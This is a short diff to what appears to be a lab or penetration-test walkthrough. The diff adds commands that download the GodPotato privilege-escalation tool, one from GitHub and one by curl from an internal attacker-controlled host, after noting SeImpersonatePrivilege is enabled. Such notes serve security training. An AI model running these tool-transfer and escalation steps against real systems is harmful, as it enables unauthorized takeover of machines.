@@ -43,6 +43,9 @@ SeImpersonatePrivilege Enabled, printspoofer vulnerability should work
 
 Used GodPotato [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato "https://github.com/BeichenDream/GodPotato")
 
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+
+curl http://192.168.49.102/GodPotato-NET4.exe -o GodPotato-NET4.exe
 
 
 
